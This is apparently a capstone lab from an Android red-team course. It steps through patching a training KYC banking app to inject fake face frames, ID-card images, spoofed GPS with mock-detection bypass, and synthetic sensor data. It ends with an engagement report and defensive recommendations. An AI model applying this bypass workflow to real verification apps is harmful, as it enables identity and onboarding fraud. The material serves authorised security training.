---
title: "Lab 6: Full Engagement"
description: "Execute a complete coordinated engagement against a multi-step KYC flow using all injection subsystems"
---

> **Prerequisites:** Labs 0-5 complete, Chapters 10-11 (Full Engagement + Evidence and Reporting) read.
>
> **Estimated time:** 60-90 minutes.
>
> **Target:** `target-kyc-basic.apk` (package `com.poc.biometric`)

This is the capstone lab. Everything you have learned converges here.

The target application simulates a banking onboarding flow with three verification steps. Each step uses a different combination of injection subsystems. All three steps must pass in a single session -- the app does not allow retrying individual steps. If one fails, you restart from the beginning.

The three verification steps:

| Step | Verification | Subsystems Required |
|------|-------------|-------------------|
| Step 1 | Face capture with liveness | Camera + Sensors |
| Step 2 | Location verification | Location (GPS + mock detection) |
| Step 3 | Document scan | Camera (different payload) |

You will conduct a full engagement: recon, prepare, execute, and report. The deliverables include an engagement report with delivery statistics and recommendations -- the same artifact you would produce for a client.

---

## Phase 1: Recon

### Decode the APK

If you do not already have a decoded copy from previous labs, decode it now:

```bash
cd /Users/josejames/Documents/android-red-team
apktool d course-1/targets/target-kyc-basic.apk -o decoded-engagement/
```

### Run the Full Surface Scan

Execute every recon grep pattern to map all hookable surfaces. Save the output -- it becomes part of your engagement report.

```bash
echo "=== RECON REPORT ===" > recon_report.txt
echo "Target: com.poc.biometric" >> recon_report.txt
echo "Date: $(date +%Y-%m-%d)" >> recon_report.txt
echo "" >> recon_report.txt

echo "--- Camera: CameraX ---" >> recon_report.txt
grep -rl "ImageAnalysis\$Analyzer\|ImageProxy\|OnImageCapturedCallback" \
  decoded-engagement/smali*/ >> recon_report.txt 2>&1
echo "" >> recon_report.txt

echo "--- Camera: Camera2 ---" >> recon_report.txt
grep -rl "OnImageAvailableListener\|CameraCaptureSession\|SurfaceTexture" \
  decoded-engagement/smali*/ >> recon_report.txt 2>&1
echo "" >> recon_report.txt

echo "--- Location: Callbacks ---" >> recon_report.txt
grep -rn "onLocationResult\|onLocationChanged\|getLastKnownLocation" \
  decoded-engagement/smali*/ >> recon_report.txt 2>&1
echo "" >> recon_report.txt

echo "--- Location: Mock Detection ---" >> recon_report.txt
grep -rn "isFromMockProvider\|isMock" \
  decoded-engagement/smali*/ >> recon_report.txt 2>&1
echo "" >> recon_report.txt

echo "--- Sensors ---" >> recon_report.txt
grep -rn "onSensorChanged" \
  decoded-engagement/smali*/ >> recon_report.txt 2>&1
echo "" >> recon_report.txt

echo "--- Sensor Types ---" >> recon_report.txt
grep -rn "TYPE_ACCELEROMETER\|TYPE_GYROSCOPE\|TYPE_MAGNETIC_FIELD" \
  decoded-engagement/smali*/ >> recon_report.txt 2>&1
echo "" >> recon_report.txt

echo "--- Geofence Coordinates ---" >> recon_report.txt
grep -rn "latitude\|longitude\|LatLng\|geofence" \
  decoded-engagement/smali*/ >> recon_report.txt 2>&1
echo "" >> recon_report.txt

echo "--- Liveness Challenge Types ---" >> recon_report.txt
grep -rn "tilt\|nod\|blink\|smile\|turn\|TILT\|NOD\|BLINK" \
  decoded-engagement/smali*/ >> recon_report.txt 2>&1
echo "" >> recon_report.txt

echo "--- Third-Party SDKs ---" >> recon_report.txt
grep -rl "com/google/mlkit" decoded-engagement/smali*/ >> recon_report.txt 2>&1
grep -rl "liveness\|verification\|biometric" decoded-engagement/smali*/ >> recon_report.txt 2>&1
echo "" >> recon_report.txt

echo "--- Evasion Surfaces ---" >> recon_report.txt
grep -rn "getPackageInfo\|GET_SIGNATURES\|MessageDigest" \
  decoded-engagement/smali*/ >> recon_report.txt 2>&1
grep -rn "classes\.dex\|getCrc\|ZipEntry" \
  decoded-engagement/smali*/ >> recon_report.txt 2>&1
echo "" >> recon_report.txt

echo "=== END RECON REPORT ===" >> recon_report.txt
```

### Analyze the Recon Output

Review `recon_report.txt` and extract:

1. **Geofence coordinates** -- Find the latitude and longitude values. For this target, they should be near Times Square: 40.7580, -73.9855.
2. **Liveness challenge types** -- Identify which active liveness challenges the app issues (tilt, nod, blink).
3. **Camera API** -- Confirm CameraX (expected for this target). Camera2 hits should be absent or minimal.
4. **SDKs** -- Note any third-party verification libraries.

Write a summary at the top of the recon report:

```bash
cat > /tmp/recon_summary.txt << 'EOF'
RECON SUMMARY
=============
Camera API:      CameraX (ImageAnalysis + ImageCapture)
Location API:    FusedLocationProvider (onLocationResult)
Mock Detection:  isFromMockProvider (patched)
Sensors:         Accelerometer + Gyroscope (onSensorChanged)
Liveness:        Active (tilt challenges detected)
Geofence:        Times Square (40.7580, -73.9855)
Third-Party:     [list any SDKs found]
Evasion:         [list any anti-tamper surfaces found]

EOF
cat recon_report.txt >> /tmp/recon_summary.txt
mv /tmp/recon_summary.txt recon_report.txt
```

---

## Phase 2: Prepare

### Patch the APK

Patch the APK and save the output for your engagement report:

```bash
cd /Users/josejames/Documents/android-red-team
java -jar patch-tool.jar course-1/targets/target-kyc-basic.apk \
  --out patched-engagement.apk \
  --work-dir ./work-engagement 2>&1 | tee patch_output.txt
```

### Cross-Reference Patch Output with Recon

Review `patch_output.txt` and confirm that every surface identified in recon has a corresponding hook:

| Recon Finding | Expected in Patch Output |
|--------------|-------------------------|
| CameraX ImageAnalysis | `analyze()` hook or `toBitmap` hook |
| CameraX ImageCapture | `onCaptureSuccess` hook |
| FusedLocationProvider | `onLocationResult` hook |
| Mock detection | `isFromMockProvider` patched |
| SensorEventListener | `onSensorChanged` hook or SensorInterceptor reference |

If any surface from recon is missing in the patch output, note it. Not every recon finding results in a hook -- some surfaces may use APIs the patch-tool does not target. Document discrepancies in your engagement report.

### Install and Grant All Permissions

```bash
adb uninstall com.poc.biometric 2>/dev/null
adb install -r patched-engagement.apk

adb shell pm grant com.poc.biometric android.permission.CAMERA
adb shell pm grant com.poc.biometric android.permission.ACCESS_FINE_LOCATION
adb shell pm grant com.poc.biometric android.permission.ACCESS_COARSE_LOCATION
adb shell pm grant com.poc.biometric android.permission.READ_EXTERNAL_STORAGE
adb shell pm grant com.poc.biometric android.permission.WRITE_EXTERNAL_STORAGE
adb shell appops set com.poc.biometric MANAGE_EXTERNAL_STORAGE allow
```

Grant everything up front. Permission dialogs during a multi-step flow cause timing issues and can force a restart.

### Prepare All Payloads

You need four payloads for the three verification steps:

**1. Face frames for Step 1 (liveness):**

These are the face frames you prepared in Lab 3 or Lab 5. They should show a neutral face, or a face performing a tilt if the active liveness challenge requires it.

```bash
# If you have face frames from a previous lab:
ls /tmp/face_frames/
# Otherwise, generate or extract them now (see Lab 3 for instructions)
```

**2. ID card image for Step 3 (document scan):**

The document scan step expects a camera feed showing an ID card or document. Prepare a single image or a short sequence of frames showing the document.

```bash
mkdir -p /tmp/id_card_frames/
# If you have an ID card image:
# ffmpeg -i id_card.png -vf "scale=640:480" /tmp/id_card_frames/001.png
# Or create a sequence of the same image for stability:
# for i in $(seq -w 1 15); do cp id_card_640x480.png /tmp/id_card_frames/${i}.png; done
```

**3. Location config for Step 2:**

```bash
cat > /tmp/engagement_location.json << 'EOF'
{
  "latitude": 40.7580,
  "longitude": -73.9855,
  "altitude": 5.0,
  "accuracy": 8.0,
  "speed": 0.0,
  "bearing": 0.0
}
EOF
```

**4. Sensor config for Step 1 (holding profile for selfie):**

Start with the "holding" profile -- a person holding the phone in selfie position. If the app issues an active liveness challenge (e.g., "tilt left"), you will switch to the tilt profile during execution.

```bash
cat > /tmp/engagement_sensor_holding.json << 'EOF'
{
  "accelX": 0.1,
  "accelY": 9.5,
  "accelZ": 2.5,
  "gyroX": 0.0,
  "gyroY": 0.0,
  "gyroZ": 0.0,
  "magX": 0.0,
  "magY": 25.0,
  "magZ": -45.0,
  "jitter": 0.15,
  "proximity": 5.0,
  "light": 300.0
}
EOF
```

Also prepare the tilt profile in case the active liveness challenge fires:

```bash
cat > /tmp/engagement_sensor_tilt_left.json << 'EOF'
{
  "accelX": 3.0,
  "accelY": 0.0,
  "accelZ": 9.31,
  "gyroX": 0.0,
  "gyroY": 0.0,
  "gyroZ": -0.15,
  "magX": 0.0,
  "magY": 25.0,
  "magZ": -45.0,
  "jitter": 0.1,
  "proximity": 5.0,
  "light": 300.0
}
EOF
```

### Push All Payloads

Push everything to the device before launching the app. All three injection subsystems auto-enable when their directories contain content.

```bash
# Camera frames (face for Step 1)
adb shell mkdir -p /sdcard/poc_frames/
adb push /tmp/face_frames/ /sdcard/poc_frames/

# Location config
adb shell mkdir -p /sdcard/poc_location/
adb push /tmp/engagement_location.json /sdcard/poc_location/config.json

# Sensor config (holding profile for initial selfie step)
adb shell mkdir -p /sdcard/poc_sensor/
adb push /tmp/engagement_sensor_holding.json /sdcard/poc_sensor/config.json
```

### Verify Payload Directories

```bash
echo "=== Payload Verification ==="
echo "Frames:" && adb shell ls /sdcard/poc_frames/ | head -5
echo "Location:" && adb shell ls /sdcard/poc_location/
echo "Sensor:" && adb shell ls /sdcard/poc_sensor/
```

All three directories must have content. If any directory is empty, the corresponding subsystem will not arm.

---

## Phase 3: Execute

### Start Logcat Capture

Start a background logcat capture that records all delivery events. This file becomes your primary evidence artifact.

```bash
adb logcat -c
adb logcat -s FrameInterceptor,LocationInterceptor,SensorInterceptor > delivery_log.txt &
LOGCAT_PID=$!
echo "Logcat capture started (PID: $LOGCAT_PID)"
```

### Launch the App

```bash
adb shell am start -n com.poc.biometric/com.poc.biometric.ui.LauncherActivity
```

### Step 1: Face Capture with Liveness

The first verification step captures a selfie and performs liveness checks. Your face frames are already being injected by the FrameInterceptor. The sensor config delivers the "holding" profile -- a person holding the phone in selfie position.

**Monitor:** Watch for `FRAME_DELIVERED` and `SENSOR_DELIVERED` events in another terminal:

```bash
adb logcat -s FrameInterceptor,SensorInterceptor | head -20
```

**If an active liveness challenge fires** (e.g., "tilt your head left"), switch the sensor config:

```bash
adb push /tmp/engagement_sensor_tilt_left.json /sdcard/poc_sensor/config.json
```

The sensor config hot-reloads within 2 seconds. The new values take effect on the next sensor event delivery.

**After the challenge completes**, switch back to the holding profile:

```bash
adb push /tmp/engagement_sensor_holding.json /sdcard/poc_sensor/config.json
```

**Capture evidence:**

```bash
adb exec-out screencap -p > step1_face.png
```

### Step 2: Location Verification

The second step checks the device's GPS coordinates against the geofence. Your location config has been active since launch -- the LocationInterceptor armed itself when it found `config.json` in `/sdcard/poc_location/`.

There is nothing to switch for this step. The location injection has been delivering Times Square coordinates since the app started.

**Monitor:** Watch for `LOCATION_DELIVERED` events:

```bash
adb logcat -d -s LocationInterceptor | tail -5
```

You should see coordinates near 40.758, -73.985 with slight jitter variation.

**Capture evidence:**

```bash
adb exec-out screencap -p > step2_location.png
```

### Step 3: Document Scan

The third step asks the user to scan an ID document. This requires switching the camera payload from face frames to document frames. The FrameInterceptor serves whatever is in `/sdcard/poc_frames/`.

**Switch camera payload:**

```bash
# Clear face frames
adb shell rm -rf /sdcard/poc_frames/*

# Push document frames
adb push /tmp/id_card_frames/ /sdcard/poc_frames/
```

The FrameInterceptor detects the new content and begins serving the document frames. If your app has an overlay with a folder switcher, you can also switch via the overlay UI without clearing and re-pushing.

**Monitor:** Watch for the new frames being delivered:

```bash
adb logcat -s FrameInterceptor | tail -5
```

You should see `FRAME_DELIVERED` events with the new folder name or updated frame indices.

**Capture evidence:**

```bash
adb exec-out screencap -p > step3_document.png
```

### Stop Logcat Capture

Once all three steps have completed:

```bash
kill $LOGCAT_PID
echo "Logcat capture stopped. Delivery log saved to delivery_log.txt"
```

---

## Phase 4: Report

### Extract Delivery Statistics

Parse the delivery log for event counts:

```bash
echo "=== Delivery Statistics ==="
echo "Frames delivered:    $(grep -c 'FRAME_DELIVERED' delivery_log.txt 2>/dev/null || echo 0)"
echo "Frames consumed:     $(grep -c 'FRAME_CONSUMED' delivery_log.txt 2>/dev/null || echo 0)"
echo "Locations delivered:  $(grep -c 'LOCATION_DELIVERED' delivery_log.txt 2>/dev/null || echo 0)"
echo "Sensor events:       $(grep -c 'SENSOR_DELIVERED' delivery_log.txt 2>/dev/null || echo 0)"
```

### Calculate Accept Rates

```bash
DELIVERED=$(grep -c 'FRAME_DELIVERED' delivery_log.txt 2>/dev/null || echo 0)
CONSUMED=$(grep -c 'FRAME_CONSUMED' delivery_log.txt 2>/dev/null || echo 0)
if [ "$DELIVERED" -gt 0 ]; then
  RATE=$(( CONSUMED * 100 / DELIVERED ))
  echo "Frame accept rate: ${RATE}%"
else
  echo "Frame accept rate: N/A (no frames delivered)"
fi
```

### Write the Engagement Report

Use the template from Chapter 11. Fill in every section with data from this engagement:

```bash
cat > engagement_report.md << 'REPORT'
# Engagement Report

## Target
- **Application:** KYC Basic
- **Package:** com.poc.biometric
- **Version:** 1.0
- **Date:** YYYY-MM-DD
- **Engagement type:** Full bypass (3-step KYC onboarding)

## Recon Summary
- **Camera API:** CameraX (ImageAnalysis + ImageCapture)
- **Location API:** FusedLocationProvider (onLocationResult)
- **Sensors:** Accelerometer + Gyroscope (onSensorChanged)
- **Liveness type:** Active (tilt challenges)
- **Geofence:** Times Square (40.7580, -73.9855)
- **Mock detection:** isFromMockProvider (patched at call site)

## Hooks Applied
[Paste relevant lines from patch_output.txt]

## Payloads Used
- **Camera frames (Step 1):** face_frames/, XX frames, 640x480
- **Camera frames (Step 3):** id_card_frames/, XX frames, 640x480
- **Location config:** 40.7580, -73.9855, accuracy 8.0m
- **Sensor config (holding):** accel=(0.1, 9.5, 2.5), jitter=0.15
- **Sensor config (tilt):** accel=(3.0, 0.0, 9.31), gyroZ=-0.15, jitter=0.1

## Results

### Step 1: Face Capture with Liveness
- **Result:** PASS / FAIL
- **Frames delivered:** [count]
- **Frames consumed:** [count]
- **Sensor events:** [count]
- **Accept rate:** [percentage]
- **Notes:** [observations about active liveness challenge, sensor switching]

### Step 2: Location Verification
- **Result:** PASS / FAIL
- **Locations delivered:** [count]
- **Notes:** [observations about coordinate jitter, geofence radius]

### Step 3: Document Scan
- **Result:** PASS / FAIL
- **Frames delivered:** [count]
- **Frames consumed:** [count]
- **Notes:** [observations about payload switch timing]

## Overall Result
- **Outcome:** FULL BYPASS / PARTIAL / FAILED
- **All steps completed with injected data:** Yes / No
- **Total engagement time:** [minutes]

## Delivery Statistics
- Frames delivered: [total across all steps]
- Frames consumed: [total]
- Frame accept rate: [percentage]
- Locations delivered: [total]
- Sensor events delivered: [total]

## Evidence
- recon_report.txt
- patch_output.txt
- step1_face.png
- step2_location.png
- step3_document.png
- delivery_log.txt

## Recommendations

1. **Implement server-side liveness verification.** The current client-side liveness check
   can be bypassed entirely through bytecode modification. Moving the liveness decision
   to a server-side model that receives raw frames over a secure channel would prevent
   client-side injection from influencing the outcome.

2. **Add certificate pinning with backup pins.** The absence of certificate pinning allows
   network-level interception. Implement pinning with at least one backup pin to prevent
   man-in-the-middle attacks against API calls that transmit verification results.

3. **Implement runtime integrity checks.** The APK's bytecode is modified without any
   detection mechanism firing. Adding runtime integrity verification (DEX checksum validation,
   signature verification at boot) would detect patched APKs before the injection subsystems
   can activate.

4. **Cross-validate sensor data server-side.** If sensor data is transmitted alongside
   camera frames, perform the cross-correlation check server-side rather than (or in
   addition to) client-side. Client-side cross-correlation is meaningless when both data
   streams are attacker-controlled.

5. **Monitor for location anomalies.** The accuracy jitter in the injected location data
   follows a uniform random distribution, which is distinguishable from real GPS noise
   (which follows a Gaussian distribution). Server-side statistical analysis of location
   accuracy sequences could flag synthetic location streams.
REPORT

echo "Engagement report written to engagement_report.md"
```

Edit the report: replace all placeholder values (`[count]`, `YYYY-MM-DD`, `PASS / FAIL`) with actual data from your engagement. The recommendations section above is a starting template -- add or modify recommendations based on what you actually observed during recon and execution.

---

## Self-Check Script

```bash
#!/bin/bash
echo "=== Lab 6: Full Engagement — Self-Check ==="
PASS=0
FAIL=0

# Phase 1: Recon
if [ -f recon_report.txt ]; then
  echo "[PASS] recon_report.txt exists"
  ((PASS++))
  if grep -q "RECON SUMMARY" recon_report.txt 2>/dev/null; then
    echo "[PASS] Recon report contains summary"
    ((PASS++))
  else
    echo "[FAIL] Recon report missing summary section"
    ((FAIL++))
  fi
else
  echo "[FAIL] recon_report.txt not found"
  ((FAIL++))
  echo "[FAIL] (skipped summary check)"
  ((FAIL++))
fi

# Phase 2: Prepare
if [ -f patch_output.txt ]; then
  echo "[PASS] patch_output.txt exists"
  ((PASS++))
else
  echo "[FAIL] patch_output.txt not found"
  ((FAIL++))
fi

# Phase 3: Execute — screenshots
for img in step1_face.png step2_location.png step3_document.png; do
  if [ -f "$img" ]; then
    echo "[PASS] $img exists"
    ((PASS++))
  else
    echo "[FAIL] $img not found"
    ((FAIL++))
  fi
done

# Phase 3: Execute — delivery log
if [ -f delivery_log.txt ]; then
  echo "[PASS] delivery_log.txt exists"
  ((PASS++))

  FRAMES=$(grep -c "FRAME_DELIVERED" delivery_log.txt 2>/dev/null || echo 0)
  LOCS=$(grep -c "LOCATION_DELIVERED" delivery_log.txt 2>/dev/null || echo 0)
  SENSORS=$(grep -c "SENSOR_DELIVERED" delivery_log.txt 2>/dev/null || echo 0)

  if [ "$FRAMES" -gt 0 ]; then
    echo "[PASS] Frames delivered: $FRAMES"
    ((PASS++))
  else
    echo "[FAIL] No FRAME_DELIVERED events in delivery log"
    ((FAIL++))
  fi

  if [ "$LOCS" -gt 0 ]; then
    echo "[PASS] Locations delivered: $LOCS"
    ((PASS++))
  else
    echo "[FAIL] No LOCATION_DELIVERED events in delivery log"
    ((FAIL++))
  fi

  if [ "$SENSORS" -gt 0 ]; then
    echo "[PASS] Sensor events delivered: $SENSORS"
    ((PASS++))
  else
    echo "[FAIL] No SENSOR_DELIVERED events in delivery log"
    ((FAIL++))
  fi
else
  echo "[FAIL] delivery_log.txt not found"
  ((FAIL++))
  echo "[FAIL] (skipped delivery stats — no log)"
  ((FAIL++))
  echo "[FAIL] (skipped delivery stats — no log)"
  ((FAIL++))
  echo "[FAIL] (skipped delivery stats — no log)"
  ((FAIL++))
fi

# Phase 4: Report
if [ -f engagement_report.md ]; then
  echo "[PASS] engagement_report.md exists"
  ((PASS++))

  if grep -q "Recommendations" engagement_report.md 2>/dev/null; then
    echo "[PASS] Report contains Recommendations section"
    ((PASS++))
  else
    echo "[FAIL] Report missing Recommendations section"
    ((FAIL++))
  fi

  if grep -q "Delivery Statistics" engagement_report.md 2>/dev/null; then
    echo "[PASS] Report contains Delivery Statistics section"
    ((PASS++))
  else
    echo "[FAIL] Report missing Delivery Statistics section"
    ((FAIL++))
  fi
else
  echo "[FAIL] engagement_report.md not found"
  ((FAIL++))
  echo "[FAIL] (skipped report content checks)"
  ((FAIL++))
  echo "[FAIL] (skipped report content checks)"
  ((FAIL++))
fi

echo ""
echo "Results: $PASS passed, $FAIL failed out of $((PASS + FAIL)) checks"
[ "$FAIL" -eq 0 ] && echo "Lab 6 COMPLETE." || echo "Lab 6 INCOMPLETE — review failed checks."
```

---

## Timing and Coordination Notes

The biggest operational challenge in a full engagement is timing. Each verification step has its own requirements, and switching payloads between steps must happen without disrupting the app's flow.

**Before launch:** All three payload directories must be populated. The camera frames should be the face frames for Step 1 (the first verification step). Location and sensor configs should already be in place. All three subsystems arm themselves during app startup.

**Between Step 1 and Step 3:** The camera payload must change from face frames to document frames. The window for this switch depends on the app's navigation flow -- you typically have several seconds while the app transitions between screens. The `adb shell rm -rf` and `adb push` commands take 1-2 seconds for a small payload. Practice the switch before the real attempt.

**Sensor config switching:** If Step 1 issues an active liveness challenge, you need to switch from the holding profile to the tilt profile and back. The hot-reload interval is 2 seconds, so push the new config as soon as the challenge appears. You have a few seconds of slack -- most liveness SDKs allow 3-5 seconds for the user to complete the action.

**Location stays constant:** The location config does not need to change between steps. The Times Square coordinates are active from launch through completion. The LocationInterceptor delivers jittered coordinates on every location callback throughout the session.

---

## What a Full Bypass Proves

When all three steps pass with injected data, you have demonstrated that:

1. **Camera injection bypasses face detection and liveness.** The app accepted synthetic frames as real camera input and passed both passive face detection and active liveness challenges.

2. **Location injection bypasses geofencing with mock detection evasion.** The app received attacker-controlled coordinates and had no mechanism to determine they were synthetic. The mock detection check was neutralized at the bytecode level.

3. **Sensor injection bypasses motion correlation.** The liveness engine's cross-correlation check between visual motion and sensor motion was satisfied with synthetic data from both streams.

4. **Multi-step verification does not compound security.** Each step was bypassed independently. The assumption that requiring multiple verification types makes the flow harder to attack does not hold when all verification happens client-side.

These findings map directly to actionable recommendations: move verification server-side, implement runtime integrity checks, add certificate pinning, and monitor for statistical anomalies in sensor and location data streams.

---

## Deliverables

| File | Description |
|------|-------------|
| `recon_report.txt` | Full surface scan with summary |
| `patch_output.txt` | Patch-tool output showing all hooks applied |
| `step1_face.png` | Screenshot of face/liveness step passing |
| `step2_location.png` | Screenshot of location verification passing |
| `step3_document.png` | Screenshot of document scan step passing |
| `delivery_log.txt` | Logcat capture of all delivery events across the session |
| `engagement_report.md` | Complete engagement report with statistics and recommendations |

---

## Success Criteria

- [ ] Recon report complete with full surface scan and summary
- [ ] Patch output saved and cross-referenced with recon findings
- [ ] All permissions granted before launch (CAMERA, ACCESS_FINE_LOCATION, storage)
- [ ] All four payloads prepared (face frames, document frames, location config, sensor config)
- [ ] All three payload directories populated before launch
- [ ] Logcat capture started before app launch
- [ ] Step 1 (face/liveness) passes with camera + sensor injection
- [ ] Step 2 (location) passes with GPS injection + mock detection bypass
- [ ] Step 3 (document scan) passes after camera payload switch
- [ ] Screenshots captured at each step
- [ ] Delivery log shows events from all three subsystems (FRAME, LOCATION, SENSOR)
- [ ] Engagement report complete with delivery statistics
- [ ] Engagement report includes actionable recommendations
- [ ] All seven deliverables saved
